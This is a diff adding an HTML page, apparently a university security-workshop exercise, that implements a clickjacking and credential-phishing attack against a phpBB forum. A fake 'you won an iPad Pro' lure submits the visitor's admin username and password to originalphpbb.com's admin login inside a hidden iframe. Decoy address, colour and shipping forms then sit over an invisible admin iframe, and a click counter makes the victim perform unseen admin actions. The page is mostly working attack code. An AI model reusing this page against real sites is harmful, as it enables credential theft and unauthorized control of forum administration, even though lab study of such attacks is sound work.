@@ -1,0 +1,477 @@
+<html>
+    <head>
+        <meta charset="windows-1252">
+        <title>Clickjacking</title>
+        <base href="/">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="icon" type="image/x-icon" href="favicon.ico">
+        <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js"></script>
+        <script defer>
+            $(document).ready(function(){
+                var MyConfObj = {
+                    iframeMouseOver : false,
+                    clickNum: 0
+                }
+                document.getElementById("app2").style.display = "none";
+                document.getElementById("app3").style.display = "none";
+                document.getElementById("app4").style.display = "none";
+                document.getElementById("app5").style.display = "none";
+                const iframe = document.getElementById("iframe");
+                window.addEventListener('blur',function(){
+                    if(MyConfObj.iframeMouseOver){
+                        MyConfObj.clickNum = MyConfObj.clickNum + 1
+                        console.log('Num clicks detectados: ' + MyConfObj.clickNum);
+                        if(MyConfObj.clickNum===2) {
+                            console.log('Num click cambio 1: ' + MyConfObj.clickNum);
+                            document.getElementById("app2").style.display = "none";
+                            document.getElementById("app3").style.display = "block";
+                        }
+                        if(MyConfObj.clickNum===4) {
+                            console.log('Num click cambio 2: ' + MyConfObj.clickNum);
+                            document.getElementById("app3").style.display = "none";
+                            document.getElementById("app4").style.display = "block";
+                        }
+                        if(MyConfObj.clickNum===9) {
+                            console.log('Num click cambio 3: ' + MyConfObj.clickNum);
+                            document.getElementById("app4").style.display = "none";
+                            document.getElementById("app5").style.display = "block";
+                        }
+                    }
+                },true);
+                document.getElementById('iframe').addEventListener('mouseover', function(){
+                    MyConfObj.iframeMouseOver = true;
+                });
+                document.getElementById('iframe').addEventListener('mouseout', function(){
+                    MyConfObj.iframeMouseOver = false;
+                });
+            });
+            function LoginAction(){
+                document.getElementById("app1").style.display = "none";
+                document.getElementById("app2").style.display = "block";
+                document.getElementById("iframe").className = "frame-click-2";
+            }
+        </script>
+        <style>
+            .all {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                height: 100%;
+            }
+
+            .ipad {
+                width: 400px;
+                position: absolute;
+                left: 250px;
+                top: 250px;
+            }
+
+            .colores {
+                position: absolute;
+                right: 85px;
+                top: -50px;
+            }
+
+            .package {
+                position: absolute;
+                right: 900px;
+                top: 104px;
+            }
+
+            .icon {
+                position: absolute;
+                left: 780px;
+                top: 521px;
+            }
+
+            .icon-2 {
+                position: absolute;
+                left: 680px;
+                top: 130px;
+                z-index: 4;
+            }
+
+            .title {
+                margin-top: 2rem;
+                margin-bottom: 1rem;
+                font-size: 3rem;
+                margin-left: 100px;
+                text-align: center;
+                font-family: sans-serif;
+                color: #0066ff;
+            }
+
+            .original {
+                text-align: center;
+                font-size: 2.5rem;
+            }
+
+            .content {
+                margin-left: 100px;
+                height: 80%;
+                width: 90%;
+                box-shadow: 5px 10px #888888;
+                background-color: white;
+                border-radius: 1rem;
+            }
+            .message{
+                display: flex;
+                width: 600px;
+                margin-left: 550px;
+                font-size: 1.5em;
+            }
+
+            .message-small{
+                display: flex;
+                width: 600px;
+                margin-left: 550px;
+            }
+
+            .frame-click-1{
+                display: none;
+            }
+            .frame-click-2{
+                position: absolute;
+                z-index: 2;
+                opacity: 0;
+                top: 200px;
+                left: 676px;
+                width: 48%;
+                height: 40%;
+                overflow: hidden;
+            }
+
+            .form-login{
+                position: absolute;
+                left: 800;
+            }
+            .form-address{
+                position: absolute;
+                left: 685;
+            }
+            .form-color{
+                position: absolute;
+                left: 990;
+                top: 221px;
+            } 
+            .form-end{
+                position: absolute;
+                left: 1047;
+                top: 339px;
+            }      
+            input[type=text], input[type=password] {
+                width: 100%;
+                padding: 12px 20px;
+                margin: 8px 0;
+                display: inline-block;
+                border: 1px solid #ccc;
+                box-sizing: border-box;
+            }
+            
+            input[type=submit] {
+                background-color: #0448b0;
+                color: white;
+                padding: 14px 20px;
+                margin: 8px 0;
+                border: none;
+                cursor: pointer;
+                width: 100%;
+            }
+            
+            input[type=submit]:hover {
+                opacity: 0.8;
+            }
+            
+            select {
+                width: 100%;
+                padding: 12px 20px;
+                margin: 8px 0;
+                display: inline-block;
+                border: 1px solid #ccc;
+                box-sizing: border-box;
+            }
+            
+            .next-button{
+                background-color: #0448b0;
+                color: white;
+                width: 70px;
+                position: absolute;
+                top: 310px;
+            }
+            
+            .next-button:hover{
+                opacity: 0.8;
+            }
+            
+            .next-button-2{
+                background-color: #0448b0;
+                color: white;
+                width: 70px;
+                position: absolute;
+                top:70px;
+                left: 170px;
+            }
+            
+            .next-button-2:hover{
+                opacity: 0.8;
+            }
+            
+            .next-button-3{
+                background-color: #0448b0;
+                color: white;
+                width: 70px;
+                position: absolute;
+                top: 99px;
+                left: 42px;
+            }
+            
+            .next-button-3:hover{
+                opacity: 0.8;
+            }
+            
+            .form-address-data{
+                z-index: 4;
+                position: absolute;
+                width: 202px;
+            }
+            .form-color-data {
+                z-index: 4;
+                position: absolute;
+                width: 202px;
+            }
+            .form-end-data {
+                z-index: 4;
+                position: absolute;
+                width: 202px;
+            }
+            .top-div-2 {
+                height: 327px;
+                width: 80%;
+                position: absolute;
+                top: 121px;
+                left: 200px;
+                background-color: transparent;
+                z-index: 3;
+                display: flex;
+                align-items: center;
+            }
+
+            .bottom-div-2 {
+                width: 80%;
+                height: 157px;
+                position: absolute;
+                bottom: 311;
+                left: 200px;
+                background-color: transparent;
+                z-index: 3;
+            }
+
+            .left-div-2 {
+                width: 500px;
+                left: 177;
+                top: 100;
+                height: 60%;
+                position: absolute;
+                bottom: 0;
+                background-color: transparent;
+                z-index: 3;
+            }
+
+            .right-div-2 {
+                width: 660px;
+                height: 60%;
+                position: absolute;
+                top: 100;
+                right: 107;
+                background-color: transparent;
+                z-index: 3;
+            }
+
+            .top-div-3 {
+                height: 165px;
+                width: 80%;
+                position: absolute;
+                top: 121px;
+                left: 200px;
+                background-color: transparent;
+                z-index: 3;
+                display: flex;
+                align-items: center;
+            }
+
+            .bottom-div-3 {
+                width: 80%;
+                height: 250px;
+                position: absolute;
+                bottom: 180;
+                left: 200px;
+                background-color: transparent;
+                z-index: 3;
+            }
+
+            .left-div-3 {
+                width: 945px;
+                left: 177;
+                top: 100;
+                height: 60%;
+                position: absolute;
+                bottom: 0;
+                background-color: transparent;
+                z-index: 3;
+            }
+
+            .right-div-3 {
+                width: 200px;
+                height: 60%;
+                position: absolute;
+                top: 100;
+                right: 107;
+                background-color: transparent;
+                z-index: 3;
+            }
+
+            .top-div-4 {
+                height: 165px;
+                width: 80%;
+                position: absolute;
+                top: 121px;
+                left: 200px;
+                background-color: red;
+                z-index: 3;
+                display: flex;
+                align-items: center;
+            }
+
+            .bottom-div-4 {
+                width: 80%;
+                height: 250px;
+                position: absolute;
+                bottom: 180;
+                left: 200px;
+                background-color: blue;
+                z-index: 3;
+            }
+
+            .left-div-4 {
+                width: 945px;
+                left: 177;
+                top: 100;
+                height: 60%;
+                position: absolute;
+                bottom: 0;
+                background-color: yellow;
+                z-index: 3;
+            }
+
+            .right-div-4 {
+                width: 200px;
+                height: 60%;
+                position: absolute;
+                top: 100;
+                right: 107;
+                background-color: green;
+                z-index: 3;
+            }
+        </style>  
+    </head>
+    <body style="background-color: rgb(183, 224, 236);">
+        <div id="app1">
+            <div class="all">
+                <p class="title">Felicidades, ha ganado un IPadPro!</p>
+                <div class="row content">
+                    <p  class="original">Este es un privilegio para los administradores de originalphpbb</p>
+                    <img class="ipad" src="file:///C:/Users/Usuario/Documents/Facultad/TSI/tallersi/clickjacking%20triste/Attack 3/ipad.jfif">
+                    <p class="message">Por favor, autenticarse como miembro de originalphpbb:</p>
+                    <form id="form" class="form-login" method="post" action="http://www.originalphpbb.com/login.php?redirect=admin/index.php&admin=1" target="iframe" >
+                        <label for="username">Username:</label>
+                        <input class="post" name="username" size="25" maxlength="40" value="admin" type="text"><br/>
+                        <label for="password">Password:</label>
+                        <input class="post" name="password" size="25" maxlength="32" type="password"><br/>
+                        <input name="redirect" value="admin/index.php?admin=1" type="hidden">
+                        <input name="admin" value="1" type="hidden">
+                        <input name="login" class="mainoption" value="Log in" type="submit" onclick="return LoginAction()">
+                    </form>
+                    <img class="icon" src="file:///C:/Users/Usuario/Documents/Facultad/TSI/tallersi/clickjacking%20triste/Attack 3/original.PNG">
+                </div>
+            </div>
+        </div>
+        <div id="app2">
+            <div id="top" class="top-div-2"></div>
+            <div id="right" class="right-div-2"></div>
+            <div id="bottom" class="bottom-div-2"></div>
+            <div id="left" class="left-div-2"></div>
+            <div class="all">
+                <div class="row content">
+                    <p  class="original">Porfavor ingresar direccion de envio:</p>
+                <div class="form-address">
+                    <div class="form-address-data">
+                        <label for="street">Calle:</label>
+                        <input name="street" type="text"><br/>
+                        <label for="state">Estado:</label>
+                        <input name="state" type="text"><br/>
+                        <label for="city">Ciudad:</label>
+                        <input name="city" type="text"><br/>
+                        <label for="country">Pais:</label>
+                        <input name="country" type="text"><br/>
+                    </div>
+                    <button class="next-button">Continuar</button>
+                </div>
+                </div>
+            </div>
+        </div>
+        <div id="app3">
+            <div class="all">
+                <div class="row content">
+                    <p  class="original">Porfavor, elega el color del ipad:</p>
+                    <div class="form-color">
+                        <div class="form-color-data">
+                            <select>
+                                <option style='display:none'>
+                                    Elegir una opcion
+                                </option>
+                                <option value="gris">Silver</option>
+                                <option value="negro">Gold</option>
+                                <option value="blanco">Space Grey</option>
+                            </select>
+                        </div>
+                        <button class="next-button-2">Continuar</button>
+                        <img class="colores" src="file:///C:/Users/Usuario/Documents/Facultad/TSI/tallersi/clickjacking%20triste/Attack 3/colores.jpg">
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="app4">
+            <div class="all">
+                <div class="row content">
+                    <p  class="original">Un paso mas!</p>
+                    <p class="message">Le gustaria recibir informacion de su envio a traves de su cuenta de originalphpbb?</p>
+                    <p class="message-small">Recibira un mensaje privado por cada paso que haga su paquete, y tendra la chance de comunicarse con el courrier en caso de que haya cualquier inconvieniente. Los tiempos de envio pueden variar segun su region, por lo que solicitamos que espere por lo menos 3 semanas antes de realizar un reclamo para no sobrecargar a nuestros operadores. Los datos de contacto seran incluidos en el mensaje de confirmacion que recibira al finalizar el proceso, junto con el codigo del envio.</p>
+                    <div class="form-end">
+                        <div class="form-end-data">
+                        <select>
+                            <option style='display:none'>
+                                Elegir una opcion
+                            </option>
+                            <option value="si">Si</option>
+                            <option value="no">No</option>
+                        </select>
+                        </div>
+                        <button class="next-button-3">Continuar</button>
+                    </div>
+                    <img class="package" src="file:///C:/Users/Usuario/Documents/Facultad/TSI/tallersi/clickjacking%20triste/Attack 3/package.jpg">
+                </div>
+            </div>
+        </div>
+        <div id="app5">
+            <div class="all">
+                <div class="row content">
+                    <p class="title">
+                        Ya esta! Recibira su voucher en la brevedad
+                        <img src="file:///C:/Users/Usuario/Documents/Facultad/TSI/tallersi/clickjacking%20triste/Attack 3/congratulations.jpg">
+                    </p>
+                </div>
+            </div>
+        </div>
+        <iframe class="frame-click-1"  name="iframe" id="iframe" ></iframe>
+    </body>
+</html>
